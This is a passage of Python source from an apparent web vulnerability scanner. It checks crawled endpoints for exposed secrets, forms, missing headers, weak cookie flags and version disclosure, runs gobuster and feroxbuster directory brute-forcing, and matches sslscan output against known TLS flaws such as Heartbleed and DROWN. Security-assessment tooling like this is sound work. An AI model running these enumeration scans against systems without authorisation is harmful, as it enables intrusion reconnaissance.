                except Exception:
                    pass

                # ── Sensitive information in source ──────────────────────────
                _ep_src_text = _ep_src_resp.text or ""
                for _sp_pat, _sp_label in _SECRET_PATTERNS:
                    _sp_match = _sp_pat.search(_ep_src_text)
                    if _sp_match:
                        _sp_val = (_sp_match.group(_sp_match.lastindex)
                                   if _sp_match.lastindex else _sp_match.group(0))
                        _sp_key = (_sp_match.group(1)
                                   if _sp_match.lastindex and _sp_match.lastindex >= 2
                                   else "")
                        if not _is_placeholder_secret(_sp_val, _sp_key):
                            out.add_finding(
                                title=f"Sensitive Information in Source: {_sp_label}",
                                url=ep_url, port=target["port"], risk="HIGH",
                                description=(
                                    f"A potential {_sp_label} was found in the page source "
                                    f"at {ep_url}. Credentials and tokens exposed in "
                                    "client-accessible source code can be harvested by "
                                    "attackers to gain unauthorised access."
                                ),
                                output=f"Match: {_sp_match.group(0)[:200]}",
                                sources="fracture-crawl", service=target["scheme"],
                                owasp="A02:2025 Cryptographic Failures", nist="IA-5",
                                remediation=(
                                    "Remove all credentials, tokens, and secrets from "
                                    "client-side source code. Use server-side environment "
                                    "variables instead."
                                ),
                                output_file=str(_ep_src_file),
                                affected=ep_url,
                            )

            # ── Form detection ───────────────────────────────────────────────
            for _fm in page_data.get("forms", []):
                _fm_inputs  = _fm.get("inputs", [])
                _fm_action  = _fm.get("action", ep_url)
                _fm_method  = _fm.get("method", "GET")
                _fm_fields  = ", ".join(i["name"] for i in _fm_inputs if i.get("name"))
                _fm_has_pwd = any(i.get("type", "").lower() == "password"
                                  for i in _fm_inputs)
                _fm_out     = (f"Form action: {_fm_action}, Method: {_fm_method}"
                               + (f", Fields: {_fm_fields}" if _fm_fields else ""))
                if _fm_has_pwd:
                    out.add_finding(
                        title="Login Page Detected",
                        url=ep_url, port=target["port"], risk="INFO",
                        description=(
                            f"A login form containing a password field was detected at "
                            f"{ep_url}. Login pages should implement multi-factor "
                            "authentication, CSRF protection, and account lockout policies."
                        ),
                        output=_fm_out, sources="fracture-crawl",
                        service=target["scheme"],
                        output_file=_ep_page_ev,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-2",
                        remediation=(
                            "Ensure the login form enforces MFA, CSRF tokens, rate limiting, "
                            "and account lockout. Transmit credentials over HTTPS only."
                        ),
                        affected=_fm_action,
                    )
                else:
                    out.add_finding(
                        title="Non-Login Form Detected",
                        url=ep_url, port=target["port"], risk="INFO",
                        description=(
                            f"A non-authentication form was detected at {ep_url}. "
                            "All forms should implement CSRF protection and strict "
                            "input validation."
                        ),
                        output=_fm_out, sources="fracture-crawl",
                        service=target["scheme"],
                        output_file=_ep_page_ev,
                        owasp="A04:2025 Insecure Design", nist="CM-7",
                        remediation=(
                            "Add CSRF tokens to all form submissions. Validate and sanitise "
                            "all input server-side to prevent injection attacks."
                        ),
                        affected=_fm_action,
                    )

        # ── Security headers + cookie attributes ─────────────────────────────
        _ep_resp = page_data.get("response")
        if _ep_resp is not None:
            _ep_hdrs = _ep_resp.headers
            _crawl_base_absent  = target.get("_base_sec_hdrs_absent",  set())
            _crawl_base_present = target.get("_base_sec_hdrs_present", set())
            for _hn, _hr, _, _hd, _hnist, _hremed in _SECURITY_HEADERS:
                if _hn == "Strict-Transport-Security" and not target["is_https"]:
                    continue
                _ep_has = _hn in _ep_hdrs
                if not _ep_has:
                    if _hn in _crawl_base_absent:
                        # Also missing at base — skip, already reported from base
                        continue
                    # Present at base, missing here — deviation; aggregate
                    _hdr_missing.setdefault(_hn, []).append(ep_url)
                    if _hn not in _hdr_meta:
                        _hdr_meta[_hn]   = (_hr, _hd, _hnist, _hremed)
                        _hdr_anchor[_hn] = ep_url
                        _hdr_code[_hn]   = _ep_resp.status_code
                    _hdr_resp.setdefault(_hn, {})[ep_url] = _ep_resp
                elif _hn in _crawl_base_absent:
                    # Absent at base but present at this endpoint — informational
                    _ep_rel_crawl = _url_rel_path(ep_url, target["url"])
                    out.add_finding(
                        title=f"Endpoint-Specific Security Header Found: {_hn}",
                        url=target["url"], port=target["port"], risk="INFO",
                        description=(
                            f"The security header '{_hn}' is present at "
                            f"endpoint {_ep_rel_crawl} but absent from the base URL. "
                            "This header appears to be applied to specific routes only."
                        ),
                        output=f"Present at endpoint: {_hn}: {_ep_hdrs.get(_hn, '')}",
                        affected=_ep_rel_crawl,
                        sources="fracture-crawl", service=target["scheme"],
                        output_file=_ep_page_ev,
                        owasp="A05:2025 Security Misconfiguration", nist=_hnist,
                        remediation=(
                            "Ensure security headers are applied consistently across "
                            "all routes. Configure them globally at the server or "
                            "middleware level."
                        ),
                        http_code=_ep_resp.status_code,
                    )
            _ep_sc_list: list = []
            try:
                _ep_sc_list = _ep_resp.raw.headers.getlist("Set-Cookie") or []
            except Exception:
                pass
            if not _ep_sc_list:
                _raw_sc = _ep_hdrs.get("Set-Cookie", "")
                if _raw_sc:
                    _ep_sc_list = [_raw_sc]
            # Save HTTP evidence once for all cookie-attribute findings on this endpoint
            _ep_cookie_ev = ""
            if _ep_sc_list:
                try:
                    _ep_ckrq, _ep_ckrp = _save_http_evidence(
                        out, "crawl", f"ep_cookie_{ep_safe}", _ep_resp)
                    _ep_cookie_ev = json.dumps(
                        [{"url": ep_url, "req": str(_ep_ckrq), "resp": str(_ep_ckrp)}])
                except Exception:
                    pass
            for _ep_sc in _ep_sc_list:
                if not _ep_sc:
                    continue
                _ep_sc_low = _ep_sc.lower()
                _ep_cname  = (_ep_sc.split("=")[0].strip() if "=" in _ep_sc
                              else _ep_sc.split(";")[0].strip())
                _ep_sc_out = f"Set-Cookie: {_ep_sc[:300]}"
                if "httponly" not in _ep_sc_low:
                    out.add_finding(
                        title="Missing Secure Cookie Attribute: HttpOnly",
                        url=ep_url, port=target["port"], risk="LOW",
                        description=(
                            f"Cookie '{_ep_cname}' does not have the HttpOnly attribute. "
                            "Without HttpOnly, the cookie is accessible to JavaScript, "
                            "exposing it to XSS-based theft."
                        ),
                        output=_ep_sc_out, sources="fracture-headers",
                        service=target["scheme"],
                        owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                        output_file=_ep_cookie_ev,
                        remediation="Add the HttpOnly attribute to all session and authentication cookies.",
                        http_code=_ep_resp.status_code,
                    )
                if target["is_https"] and "secure" not in _ep_sc_low:
                    out.add_finding(
                        title="Missing Secure Cookie Attribute: Secure",
                        url=ep_url, port=target["port"], risk="LOW",
                        description=(
                            f"Cookie '{_ep_cname}' does not have the Secure attribute on an HTTPS site. "
                            "Without Secure, the cookie can be transmitted over unencrypted HTTP connections."
                        ),
                        output=_ep_sc_out, sources="fracture-headers",
                        service=target["scheme"],
                        owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                        output_file=_ep_cookie_ev,
                        remediation="Add the Secure attribute to all cookies on HTTPS sites.",
                        http_code=_ep_resp.status_code,
                    )
                if not re.search(r'samesite\s*=\s*', _ep_sc_low):
                    out.add_finding(
                        title="Missing Secure Cookie Attribute: SameSite",
                        url=ep_url, port=target["port"], risk="LOW",
                        description=(
                            f"Cookie '{_ep_cname}' does not have the SameSite attribute. "
                            "Without SameSite, the cookie is sent on cross-site requests, "
                            "enabling CSRF attacks."
                        ),
                        output=_ep_sc_out, sources="fracture-headers",
                        service=target["scheme"],
                        owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                        output_file=_ep_cookie_ev,
                        remediation="Add SameSite=Strict or SameSite=Lax to prevent cross-site request forgery.",
                        http_code=_ep_resp.status_code,
                    )

            # ── Software version disclosure ──────────────────────────────────
            for _vh, _vr in (("Server", "LOW"), ("X-Powered-By", "LOW"),
                             ("X-AspNet-Version", "LOW"), ("X-Runtime", "INFO"),
                             ("X-Generator", "INFO")):
                _vhv = _ep_hdrs.get(_vh, "")
                if _vhv:
                    _vname, _vver = _parse_software(_vhv)
                    if _vver:
                        out.add_finding(
                            title=f"Software Version Disclosed: {_vname} {_vver}",
                            url=ep_url, port=target["port"], risk=_vr,
                            description=(
                                f"The HTTP response header '{_vh}' discloses software "
                                f"version information: {_vhv}. Attackers can use disclosed "
                                "version numbers to identify known vulnerabilities."
                            ),
                            output=f"{_vh}: {_vhv}",
                            sources="fracture-headers", service=target["scheme"],
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation=(
                                f"Configure the server to suppress the '{_vh}' response "
                                "header or remove version numbers from its value."
                            ),
                            affected=ep_url,
                            http_code=_ep_resp.status_code,
                        )

        # ── Directory brute-force ────────────────────────────────────────────
        # Inherit the parent wildcard only when this endpoint is on the same
        # hostname as the target.  A different subdomain (e.g. admin.example.com
        # discovered via crawl while scanning example.com) must be tested
        # independently — it is a distinct host and may not be a wildcard.
        # Skip wildcard detection entirely for file URLs — brute-force will be
        # skipped anyway and probing a CSS/JS/image path for wildcards is pointless.
        _ep_host = urllib.parse.urlparse(ep_url).hostname or ""
        _same_host = (_ep_host == target["hostname"])
        if _url_is_file(ep_url):
            ep_wc = None  # file URLs are never brute-forced; no wildcard probe needed
        elif wc_baseline is not None and _same_host:
            ep_wc = wc_baseline
            vc.log(f"[endpoint_tools] Parent wildcard — skipping brute-force for {ep_url}", "INFO")
        else:
            ep_wc = _detect_wildcard(ep_url, sess, timeout)
            if ep_wc is not None:
                vc.log(f"[endpoint_tools] Wildcard detected on {ep_url} — skipping brute-force", "INFO")

        if ep_wc is None and gobuster and Path(wordlist_dir).exists() and not _url_is_file(ep_url):
            ep_gob = out.output_path("recon", f"gobuster_ep_{ep_safe}")
            cmd = [gobuster, "dir", "-u", ep_url, "-w", wordlist_dir,
                   "-t", "20", "-q", "-k", "-o", str(ep_gob)]
            cmd += _buster_auth_flags(sess)
            vc.log(f"[endpoint_tools] gobuster on {ep_url}", "INFO")
            _gobuster_run(cmd, ep_gob, "endpoint_tools", out, timeout=180)
            if ep_gob.exists():
                try:
                    _ep_ps, _ep_rd = {}, {}
                    _epg_res = _filter_buster_wildcards(
                        _parse_gobuster_with_status(ep_gob, ep_url), sess, timeout)
                    for _gu, _gs, _gr in _epg_res:
                        _sp = urllib.parse.urlparse(_gu).path or "/"
                        _ep_ps[_sp] = _gs
                        if _gr:
                            _ep_rd[_sp] = _gr
                    if _ep_ps:
                        _write_structure_map(out, target, path_statuses=_ep_ps,
                                             path_redirects=_ep_rd or None,
                                             evidence_files=[str(ep_gob)],
                                             source="gobuster")
                except Exception:
                    pass

        if ep_wc is None and gobuster and Path(wordlist_file).exists() and not _url_is_file(ep_url):
            ep_gob_f = out.output_path("recon", f"gobuster_ep_files_{ep_safe}")
            cmd = [gobuster, "dir", "-u", ep_url, "-w", wordlist_file,
                   "-t", "20", "-q", "-k", "-o", str(ep_gob_f)]
            cmd += _buster_auth_flags(sess)
            _gobuster_run(cmd, ep_gob_f, "endpoint_tools", out, timeout=180)
            if ep_gob_f.exists():
                try:
                    _ep_ps, _ep_rd = {}, {}
                    _epgf_res = _filter_buster_wildcards(
                        _parse_gobuster_with_status(ep_gob_f, ep_url), sess, timeout)
                    for _gu, _gs, _gr in _epgf_res:
                        _sp = urllib.parse.urlparse(_gu).path or "/"
                        _ep_ps[_sp] = _gs
                        if _gr:
                            _ep_rd[_sp] = _gr
                    if _ep_ps:
                        _write_structure_map(out, target, path_statuses=_ep_ps,
                                             path_redirects=_ep_rd or None,
                                             evidence_files=[str(ep_gob_f)],
                                             source="gobuster")
                except Exception:
                    pass

        # feroxbuster: always run on directories — handles wildcards natively
        if feroxbuster and Path(wordlist_dir).exists() and not _url_is_file(ep_url):
            ep_fer = out.output_path("recon", f"feroxbuster_ep_{ep_safe}")
            cmd = [feroxbuster, "--url", ep_url, "--wordlist", wordlist_dir,
                   "--depth", "1", "--threads", _ep_fer_threads, "--quiet",
                   "--status-codes", _ep_fer_sc,
                   "--output", str(ep_fer), "--insecure", "--auto-tune",
                   "--time-limit", "2m"]
            if _ep_tools_cdn:
                cmd += ["--rate-limit", "25"]
            cmd += _buster_auth_flags(sess)
            vc.log(f"[endpoint_tools] feroxbuster on {ep_url}", "INFO")
            _ep_fer_proc = None
            try:
                _ep_fer_proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(_ep_fer_proc)
                _ep_fer_proc.communicate(timeout=180)
                _deregister_proc(_ep_fer_proc)
                out.log_command("feroxbuster", cmd, ep_fer)
            except subprocess.TimeoutExpired:
                _ep_fer_proc.kill()
                _ep_fer_proc.communicate()
                _deregister_proc(_ep_fer_proc)
                vc.log(f"[endpoint_tools] feroxbuster timed out after 180s — killed", "WARNING")
            except Exception as e:
                if _ep_fer_proc:
                    try: _ep_fer_proc.kill(); _ep_fer_proc.communicate()
                    except Exception: pass
                    _deregister_proc(_ep_fer_proc)
                out.log_error("feroxbuster", cmd, str(e))
            if ep_fer.exists():
                try:
                    _ep_ps, _ep_rd = {}, {}
                    _epf_res = _filter_buster_wildcards(
                        _parse_feroxbuster_with_status(ep_fer), sess, timeout)
                    for _fu, _fs, _fr in _epf_res:
                        _sp = urllib.parse.urlparse(_fu).path or "/"
                        _ep_ps[_sp] = _fs
                        if _fr:
                            _ep_rd[_sp] = _fr
                    if _ep_ps:
                        _write_structure_map(out, target, path_statuses=_ep_ps,
                                             path_redirects=_ep_rd or None,
                                             evidence_files=[str(ep_fer)],
                                             source="feroxbuster")
                except Exception:
                    pass

    # ── Aggregated "Interesting Endpoint Discovered" (one per base domain) ─────
    for _ie_nl, _ie_data in _ie_by_netloc.items():
        _ie_sorted = sorted(_ie_data["paths"].keys())
        out.add_finding(
            title="Interesting Endpoint Discovered",
            url=_ie_data["anchor"], port=target["port"], risk="INFO",
            description=(
                f"{len(_ie_sorted)} potentially sensitive endpoint(s) found at {_ie_nl}."
            ),
            sources="fracture-crawl", service=target["scheme"],
            affected="\n".join(_ie_sorted),
            output_file=_ie_crawl_out.get(_ie_nl, ""),
            owasp="A04:2025 Insecure Design", nist="CM-7",
            remediation="Review these endpoints for access controls.",
        )

    # ── Aggregated security header findings (one per header, all URLs listed) ──
    for _hn, _urls in _hdr_missing.items():
        _hr, _hd, _hnist, _hremed = _hdr_meta[_hn]
        _hn_safe = re.sub(r'[^\w]', '_', _hn)[:40]
        _ep_url_resp_map = _hdr_resp.get(_hn, {})
        _ev_list = []
        for _eu in _urls:
            _er = _ep_url_resp_map.get(_eu)
            if _er is not None:
                try:
                    _eu_safe = re.sub(r'[^\w]', '_', _eu)[:30]
                    _ep_hrq, _ep_hrp = _save_http_evidence(
                        out, "headers", f"ep_header_{_hn_safe}_{_eu_safe}", _er)
                    _ev_list.append({"url": _eu, "req": str(_ep_hrq), "resp": str(_ep_hrp)})
                except Exception:
                    pass
        _ep_hdr_ev = json.dumps(_ev_list) if _ev_list else ""
        out.add_finding(
            title=f"Missing Security Header: {_hn}",
            url=_hdr_anchor[_hn],
            port=target["port"], risk=_hr,
            description=_hd, sources="fracture-headers",
            service=target["scheme"],
            owasp="A05:2025 Security Misconfiguration", nist=_hnist,
            remediation=_hremed,
            output=f"Missing: {_hn}",
            affected="\n".join(_url_rel_path(u, target["url"]) for u in _urls),
            output_file=_ep_hdr_ev,
            http_code=_hdr_code[_hn],
        )

    vc.status("endpoint_tools", "Endpoint Tools", "complete", "Done",
              len(endpoints), len(endpoints))
    vc.log("[endpoint_tools] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 1: TLS
# ─────────────────────────────────────────────

# ── sslscan certificate + cipher line-level parsing ───────────────────────────
_RE_SS_SUBJECT     = re.compile(r"Subject:\s+(.+)")
_RE_SS_ISSUER      = re.compile(r"Issuer:\s+(.+)")
_RE_SS_EXPIRY      = re.compile(r"Not valid after:\s+(.+)", re.I)
_RE_SS_SELF        = re.compile(r"self[- ]signed", re.I)
_RE_SS_CIPHER_LINE = re.compile(r"Accepted\s+(\S+)\s+(\d+)\s+bits\s+(\S+)", re.I)

# ── testssl text-based certificate parsing ────────────────────────────────────
_RE_TS_SUBJECT = re.compile(r"subject\s*[:/]\s*(.+)", re.I)
_RE_TS_ISSUER  = re.compile(r"issuer\s*[:/]\s*(.+)", re.I)
_RE_TS_EXPIRY  = re.compile(r"expires\s*[:/]\s*(.+)", re.I)
_RE_TS_SAN     = re.compile(r"subjectAltName.*?:\s*(.+)", re.I)
_RE_TS_GRADE   = re.compile(r"Overall Grade\s*[:\-]\s*([A-F][+-]?)", re.I)

# ── testssl JSON structured finding extraction ────────────────────────────────
_TESTSSL_CVES_JSON = {
    "heartbleed":  "CVE-2014-0160",
    "ROBOT":       "CVE-2017-13099",
    "DROWN":       "CVE-2016-0800",
    "POODLE":      "CVE-2014-3566",
    "BEAST":       "CVE-2011-3389",
    "CCS":         "CVE-2014-0224",
    "LUCKY13":     "CVE-2013-0169",
    "FREAK":       "CVE-2015-0204",
    "LOGJAM":      "CVE-2015-4000",
    "SWEET32":     "CVE-2016-2183",
    "ticketbleed": "CVE-2016-9244",
}
_TESTSSL_RISK_MAP = {
    "CRITICAL": "CRITICAL",
    "HIGH":     "HIGH",
    "MEDIUM":   "MEDIUM",
    "LOW":      "LOW",
    "WARN":     "INFO",
    "INFO":     "INFO",
    "OK":       "INFO",
}
# Maps testssl JSON 'id' values for deprecated protocols to normalised titles
_TESTSSL_PROTO_IDS = {
    "SSLv2":  "SSLv2",
    "SSLv3":  "SSLv3",
    "TLS1":   "TLSv1.0",
    "TLS1_1": "TLSv1.1",
}
# testssl JSON ids that produce no useful pentest finding — skip entirely
_TS_SKIP_IDS = frozenset({
    "overall_grade", "cert_revocation", "cert_trust",
    "security_headers", "FS_TLS12_sig_algs",
    "TLS1_2", "TLS1_3",
})


_TLS_VULN_PATTERNS = {
    # Tuples: (pattern, risk, cve, affected_cipher)
    # affected_cipher is non-empty only for weak cipher entries; callers use it
    # to emit title="Weak Cipher Identified" with the cipher type in affected.
    # Risk levels based on NVD CVSS scores and pentest industry consensus.
    "Deprecated Protocol Enabled: SSLv2":   (re.compile(r'SSLv2\s+enabled|Accepted\s+SSLv2', re.I),   "CRITICAL", "CVE-2016-0800", ""),
    "Deprecated Protocol Enabled: SSLv3":   (re.compile(r'SSLv3\s+enabled|Accepted\s+SSLv3', re.I),   "HIGH",     "CVE-2014-3566", ""),
    # TLSv1.0: MEDIUM — BEAST (CVE-2011-3389, CVSS 4.3) is largely mitigated by browser 1/n-1 splitting;
    # non-trivially exploitable in practice. PCI DSS prohibits it post-2018. CWE-326.
    "Deprecated Protocol Enabled: TLSv1.0": (re.compile(r'TLSv1\.0\s+enabled|Accepted\s+TLSv1\.0\b', re.I), "MEDIUM", "CVE-2011-3389", ""),
    # TLSv1.1: MEDIUM — deprecated per RFC 8996 (2021); no forward secrecy; SHA-1 integrity.
    # No single exploited CVE but formally deprecated and prohibited by PCI DSS. CWE-326.
    "Deprecated Protocol Enabled: TLSv1.1": (re.compile(r'TLSv1\.1\s+enabled|Accepted\s+TLSv1\.1', re.I), "MEDIUM", "", ""),
    # RC4: MEDIUM — statistical bias (CVE-2013-2566 CVSS 4.3); Bar Mitzvah attack (CVE-2015-2808 CVSS 4.3).
    # RFC 7465 prohibits RC4 in TLS. CWE-327.
    "Weak Cipher Identified: RC4":          (re.compile(r'\bRC4\b', re.I),          "MEDIUM",   "CVE-2013-2566, CVE-2015-2808", "RC4"),
    "Weak Cipher Identified: NULL":         (re.compile(r'NULL\s+Cipher|NULL-', re.I), "CRITICAL", "", "NULL"),
    # EXPORT: MEDIUM — FREAK attack (CVE-2015-0204 CVSS 4.3); requires active MITM. CWE-326.
    "Weak Cipher Identified: EXPORT":       (re.compile(r'\bEXPORT\b', re.I),       "MEDIUM",   "CVE-2015-0204", "EXPORT"),
    # DES: MEDIUM — SWEET32 birthday attack on 64-bit block ciphers (CVE-2016-2183). CWE-326.
    "Weak Cipher Identified: DES":          (re.compile(r'\bDES\b(?!-CBC3)', re.I), "MEDIUM",   "CVE-2016-2183", "DES"),
    "Heartbleed (CVE-2014-0160) Vulnerability Detected":
                                            (re.compile(r'heartbleed|VULNERABLE.*heartbleed', re.I), "CRITICAL", "CVE-2014-0160", ""),
    "SSL/TLS Vulnerability: POODLE":        (re.compile(r'POODLE|VULNERABLE.*poodle', re.I),  "HIGH",   "CVE-2014-3566", ""),
    "SSL/TLS Vulnerability: BEAST":         (re.compile(r'BEAST|VULNERABLE.*beast', re.I),    "MEDIUM", "CVE-2011-3389", ""),
    "SSL/TLS Vulnerability: CRIME":         (re.compile(r'CRIME|VULNERABLE.*crime', re.I),    "HIGH",   "CVE-2012-4929", ""),
    # DROWN: HIGH — cross-protocol Bleichenbacher oracle via SSLv2 decrypts TLS sessions
    # (CVE-2016-0800 CVSS v3 5.9 MEDIUM; pentest consensus HIGH given C:H impact). CWE-310.
    "SSL/TLS Vulnerability: DROWN":         (re.compile(r'DROWN|VULNERABLE.*drown', re.I),    "HIGH",   "CVE-2016-0800", ""),
    "SSL/TLS Vulnerability: LOGJAM":        (re.compile(r'LOGJAM|VULNERABLE.*logjam', re.I),  "HIGH",   "CVE-2015-4000", ""),
    "SSL/TLS Vulnerability: FREAK":         (re.compile(r'FREAK|VULNERABLE.*freak', re.I),    "MEDIUM", "CVE-2015-0204", ""),
    "SSL/TLS Vulnerability: SWEET32":       (re.compile(r'SWEET32|3DES.*cipher|DES-CBC3', re.I), "MEDIUM", "CVE-2016-2183", ""),
    "SSL/TLS Vulnerability: LUCKY13":       (re.compile(r'LUCKY13|lucky13', re.I),            "MEDIUM", "CVE-2013-0169", ""),
    # Self-Signed: MEDIUM — eliminates PKI trust chain, enabling MITM; requires attacker positioning.
    # CWE-295 (Improper Certificate Validation), CWE-296.
    "SSL/TLS Certificate: Self-Signed":     (re.compile(r'self.signed|Self signed', re.I),    "MEDIUM", "", ""),
    "SSL/TLS Certificate: Expired":         (re.compile(r'expired|NOT after.*passed', re.I),  "HIGH",   "", ""),
}


def _phase_tls(target: dict, cfg: dict, pm: ProgressManager,
               out: OutputManager, sess: requests.Session) -> None:
    if not target["is_https"]:
        vc.log("[tls] HTTP-only target — skipping TLS phase", "WARNING")
        return
    phase     = "tls"
    hostname  = target["hostname"]
    port      = target["port"]
    host_port = f"{hostname}:{port}"
    vc.status(phase, "TLS Analysis", "running", "sslscan", 0, 4)

    _tls_profile_info: dict = {}

    sslscan = _find_tool("sslscan")
    if sslscan:
        out_f = out.output_path(phase, f"sslscan_{hostname}_{port}")
        cmd   = [sslscan, "--no-colour", host_port]
        vc.log(f"[tls] Running sslscan on {host_port}", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=120)
            _deregister_proc(proc)
            out_f.write_text(stdout, encoding="utf-8")
            out.log_command("sslscan", cmd, out_f)
            # Filter "not vulnerable" lines and bare section headers.
            # sslscan emits lines like "  Heartbleed:" (header only, no result)
            # followed by per-protocol result lines. The header line survives a
            # "not vulnerable" filter and falsely matches heartbleed patterns.
            _SSL_SECTION_HDR = re.compile(r'^\s+[\w ,()/-]+:\s*$')
            _sslscan_filtered = "\n".join(
                ln for ln in stdout.splitlines()
                if "not vulnerable" not in ln.lower()
                and not _SSL_SECTION_HDR.match(ln)
            )
            for ftitle, (pat, risk, cve, _affected) in _TLS_VULN_PATTERNS.items():
                if pat.search(_sslscan_filtered):
                    _emit_title = "Weak Cipher Identified" if _affected else ftitle
                    out.add_finding(
                        title=_emit_title, url=target["url"], port=port,
                        risk=risk, description=f"TLS issue: {_emit_title}",
                        cves=cve, sources="sslscan", service="https",
                        output_file=str(out_f),
                        affected=_affected or "",
                        owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                        remediation="Disable weak protocols/ciphers. Use TLS 1.2/1.3 with AEAD ciphers.",
                    )
            # ── Certificate extraction + cipher-based vulnerability inference ─
            _ss_cert_subject = None
            _ss_cert_issuer  = None
            _ss_cert_expiry  = None
            _ss_cert_valid   = None
            _ss_ciphers: list = []
            for _ssln in stdout.splitlines():
                _ssln = _ssln.strip()
                if not _ssln:
                    continue
                if not _ss_cert_subject:
                    _m = _RE_SS_SUBJECT.search(_ssln)
                    if _m:
                        _ss_cert_subject = _m.group(1).strip()
                        continue
                if not _ss_cert_issuer:
                    _m = _RE_SS_ISSUER.search(_ssln)
                    if _m:
                        _ss_cert_issuer = _m.group(1).strip()
                        continue
                if not _ss_cert_expiry:
                    _m = _RE_SS_EXPIRY.search(_ssln)
                    if _m:
                        _ss_cert_expiry = _m.group(1).strip()
                        continue
                if _RE_SS_SELF.search(_ssln):
                    _ss_cert_valid = "self-signed"
                _m = _RE_SS_CIPHER_LINE.match(_ssln)
                if _m:
                    _ss_ciphers.append({
                        "protocol": _m.group(1),
                        "bits":     _m.group(2),
                        "cipher":   _m.group(3),
                    })
            _tls_profile_info.update({
                "cert_subject": _ss_cert_subject,
                "cert_issuer":  _ss_cert_issuer,
                "cert_expiry":  _ss_cert_expiry,
                "cert_valid":   _ss_cert_valid,
                "protocols":    sorted({c.get("protocol") for c in _ss_ciphers
                                        if c.get("protocol")}),
            })
            # Dedicated Heartbleed check on raw output — the section-header filter
            # removes "  Heartbleed:" so the generic _TLS_VULN_PATTERNS match fails.
            _hb_sect = re.search(
                r'Heartbleed:(.*?)(?=\n\s*\n|\n[A-Z]|\Z)', stdout, re.DOTALL | re.I)
            if _hb_sect:
                _hb_body = _hb_sect.group(1)
                if (re.search(r'\bvulnerable\b', _hb_body, re.I)
                        and not re.search(r'not vulnerable', _hb_body, re.I)):
                    out.add_finding(
                        title="Heartbleed (CVE-2014-0160) Vulnerability Detected",
                        url=target["url"], port=port, risk="CRITICAL",
                        description=(
                            "sslscan: The server is vulnerable to Heartbleed (CVE-2014-0160). "
                            "Attackers can read up to 64 KB of server memory per request, "
                            "exposing private keys, session tokens, and credentials."
                        ),
                        cves="CVE-2014-0160", sources="sslscan", service="https",
                        output_file=str(out_f),
                        owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                        remediation=(
                            "Update OpenSSL to 1.0.1g+ or 1.0.2+. Revoke and reissue "
                            "all certificates. Invalidate all active session tokens."
                        ),
                    )
            # Explicit cert expiry check — compare parsed Not-valid-after date to UTC now
            if _ss_cert_expiry:
                try:
                    from datetime import datetime as _dt
                    _exp_date = None
                    _clean_exp = (_ss_cert_expiry.strip()
                                  .replace(" GMT", "").replace(" UTC", ""))
                    for _fmt in (
                        "%b %d %H:%M:%S %Y",
                        "%b  %d %H:%M:%S %Y",
                        "%Y-%m-%dT%H:%M:%S",
                        "%Y-%m-%d",
                    ):
                        try:
                            _exp_date = _dt.strptime(_clean_exp, _fmt)
                            break
                        except ValueError:
                            continue
                    if _exp_date and _exp_date < _dt.now(__import__('datetime').timezone.utc).replace(tzinfo=None):
                        out.add_finding(
                            title="SSL/TLS Certificate: Expired",
                            url=target["url"], port=port, risk="HIGH",
                            description="The server's TLS certificate has passed its expiry date, causing browser trust errors and indicating a breakdown in certificate lifecycle management.",
                            output=f"Not valid after: {_ss_cert_expiry}",
                            sources="sslscan", service="https",
                            output_file=str(out_f),
                            owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                            remediation="Renew the certificate immediately and implement automated renewal (e.g., ACME/Let's Encrypt) to prevent future expiry.",
                        )
                except Exception:
                    pass
            if _ss_cert_valid == "self-signed":
                out.add_finding(
                    title="SSL/TLS Certificate: Self-Signed",
                    url=target["url"], port=port, risk="MEDIUM",
                    description="The server presented a self-signed TLS certificate that is not anchored to a publicly trusted CA, preventing clients from verifying the server's identity and enabling trivial MITM attacks.",
                    sources="sslscan", service="https",
                    output_file=str(out_f),
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Replace self-signed certificates with certificates issued by a trusted CA; use ACME/Let's Encrypt for cost-free automation.",
                )
            _tls10_on    = any("1.0" in c.get("protocol", "") for c in _ss_ciphers)
            _cbc_suites  = [c["cipher"] for c in _ss_ciphers if "cbc" in c["cipher"].lower()]
            _3des_suites = [c["cipher"] for c in _ss_ciphers
                            if "3des" in c["cipher"].lower() or "des-cbc3" in c["cipher"].lower()]
            if _3des_suites:
                out.add_finding(
                    title="SSL/TLS Vulnerability: SWEET32",
                    url=target["url"], port=port, risk="MEDIUM",
                    description=(
                        f"sslscan: 3DES cipher suites accepted — susceptible to SWEET32 "
                        f"(CVE-2016-2183): {', '.join(_3des_suites[:5])}"
                    ),
                    cves="CVE-2016-2183", sources="sslscan", service="https",
                    output_file=str(out_f),
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Disable 3DES cipher suites. Use AEAD ciphers (AES-GCM) only.",
                )
            if _tls10_on and _cbc_suites:
                out.add_finding(
                    title="SSL/TLS Vulnerability: BEAST",
                    url=target["url"], port=port, risk="MEDIUM",
                    description=(
                        "sslscan: TLSv1.0 enabled with CBC cipher suites — "
                        "susceptible to BEAST (CVE-2011-3389)"
                    ),
                    cves="CVE-2011-3389", sources="sslscan", service="https",
                    output_file=str(out_f),
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Disable TLSv1.0 and CBC cipher suites.",
                )
            if _cbc_suites:
                out.add_finding(
                    title="SSL/TLS Vulnerability: LUCKY13",
                    url=target["url"], port=port, risk="MEDIUM",
                    description=(
                        "sslscan: CBC cipher suites accepted — "
                        "susceptible to LUCKY13 (CVE-2013-0169)"
                    ),
                    cves="CVE-2013-0169", sources="sslscan", service="https",
                    output_file=str(out_f),
                    owasp="A02:2025 Cryptographic Failures", nist="SC-8",
                    remediation="Prefer AEAD cipher suites (AES-GCM/AES-CCM) over CBC.",
                )
        except Exception as e:
            out.log_error("sslscan", cmd, str(e))
    else:
        vc.error("[tls] sslscan not found — install sslscan for full TLS analysis",
                 source="tls", category="Tool")

    vc.status(phase, "TLS Analysis", "running", "testssl.sh", 2, 4)
